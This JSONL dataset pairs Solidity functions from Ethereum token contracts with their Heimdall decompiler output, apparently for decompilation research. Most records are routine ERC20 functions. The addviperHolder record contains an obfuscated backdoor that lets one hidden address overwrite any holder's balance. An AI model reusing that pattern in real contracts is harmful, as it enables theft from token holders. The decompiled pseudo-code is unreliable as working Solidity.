{"contract_address": "0x20C7b73Be0B1AD179Db94e5b0AC9aD86fa0f068c", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a] > 0);\n        store_g = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_g));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f / 0x01), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).Unresolved_791ac947(var_l); // call\n        store_g = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_g));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x959Cab41Be70E2c8B29A15f45C088C2101620149", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x649695aB734cF73FDD08262D5297F0f34368274C", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x050355a5eA2d1590C7FBB1aA354b4f698d221b37", "original_solidity_code": "function isExcludedFromFees(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x1d;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0x31F2C94D3EF63551FF418747EbBe67E5A083aDC0", "original_solidity_code": "function manualSwap() external {\\n        require(_msgSender() == _taxWallet);\\n        uint256 tokenBalance = balanceOf(address(this));\\n\\n        if(tokenBalance > 0){\\n          swapTokensForEth(tokenBalance);\\n        }\\n\\n        uint256 ethBalance = address(this).balance;\\n\\n        if(ethBalance > 0){\\n          sendETHToFee(ethBalance);\\n        }\\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > 0);\n        store_c = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_c));\n        require(!storage_map_b[var_a] - 0);\n        require(!bytes1(store_c / 0x010000000000000000000000000000000000000000));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_l / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_l / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_l / 0x01), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_l / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_l / 0x01).Unresolved_791ac947(var_l); // call\n        store_c = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_c));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xE575f6f50AF7A409F7381F15bC25Ff9dD9414660", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(arg1 - 0, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(swapEnabled / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(msg.sender)) == (address(_owner / 0x01))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == (address(_owner / 0x01))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0xdead), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0xdead), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x19;\n        require(bytes1(storage_map_b[var_a] / 0x01), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x1b;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalTaxes > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!arg1 | (sellTotalTaxes == ((arg1 * sellTotalTaxes) / arg1)), \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(0 > 0), \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(this) - 0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_b[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x26;\n        var_h = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_i = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - 0;\n        var_a = address(this);\n        var_b = 0;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + 0)), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] + 0;\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x1b;\n        if (!storage_map_b[var_a] / 0x01) {\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer from the zero address\");\n        }\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x1b;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalTaxes > 0), \"ERC20: transfer from the zero address\");\n        require(!(0 > 0), \"ERC20: transfer from the zero address\");\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x1b;\n        if (!storage_map_b[var_a] / 0x01) {\n            if (!buyTotalTaxes > 0) {\n            }\n            if (!swapEnabled / 0x010000) {\n                if (!swapEnabled / 0x010000) {\n                    if (!swapEnabled / 0x010000) {\n                        if (!swapEnabled / 0x010000) {\n                            if (!swapEnabled / 0x010000) {\n                            }\n                        }\n                    }\n                }\n            }\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1b;\n            require(bytes1(swapEnabled / 0x0100), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1a;\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1b;\n            require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1a;\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1a;\n            require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n        }\n        require(!(arg1 > maxTxAmount), \"Sell transfer amount exceeds the maxTxAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x2d;\n        var_h = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_i = 0x206d61785478416d6f756e742e00000000000000000000000000000000000000;\n        if (!storage_map_b[var_a] / 0x01) {\n        }\n        require(!(arg1 > maxTxAmount), \"Buy transfer amount exceeds the maxTxAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x2c;\n        var_h = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_i = 0x6d61785478416d6f756e742e0000000000000000000000000000000000000000;\n        if (!storage_map_b[var_a] / 0x01) {\n        }\n        var_a = address(msg.sender);\n        var_b = 0x19;\n        require(bytes1(storage_map_b[var_a] / 0x01), \"Trading is not active.\");\n        require(bytes1(storage_map_b[var_a] / 0x01), \"Trading is not active.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x16;\n        var_h = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (address(arg0) == 0) {\n            if (address(arg0) == 0) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xE575f6f50AF7A409F7381F15bC25Ff9dD9414660", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\r\\n        _transferOwnership(address(0));\\r\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _owner = 0 | (uint96(_owner));\n        emit OwnershipTransferred(address(_owner / 0x01), 0);\n    }"}
{"contract_address": "0x2196c73Bee850827528bf2e164c33441834dFe03", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_j) {\n            if (!(store_j) == ((store_j >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_j >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_j >> 0x01;\n                if (store_j) {\n                    if (!(store_j) == ((store_j >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_j >> 0x01) {\n                            if (0x1f < (store_j >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_j >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1", "original_solidity_code": "function switchOrigin(address _newOne) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        _origin = _newOne;\r\n    }", "heimdall_decompiled_code": "function switchOrigin(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(store_c)), \"Caller is not the original caller\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x43616c6c6572206973206e6f7420746865206f726967696e616c2063616c6c65;\n        var_e = 0x7200000000000000000000000000000000000000000000000000000000000000;\n        store_c = (address(arg0)) | (uint96(store_c));\n    }"}
{"contract_address": "0xC1687b1453E40Bd9F46b33dFf3c6ea3A0Ea168eA", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8", "original_solidity_code": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }", "heimdall_decompiled_code": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }"}
{"contract_address": "0x92E27aedE3847Bbd0E4b917Ec2Ae444d4C3A622D", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7F073dD6bC1B6480d8f06Ebedd6c53f4dD9c8DBc", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2b16EE33D8A9818d8B11fD3400916c824EAa7De9", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n    _balances[_msgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        require(!(arg1 > storage_map_b[var_a]), \"TT: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x54543a207472616e7366657220616d6f756e7420657863656564732062616c61;\n        var_g = 0x6e63650000000000000000000000000000000000000000000000000000000000;\n        var_a = msg.sender;\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 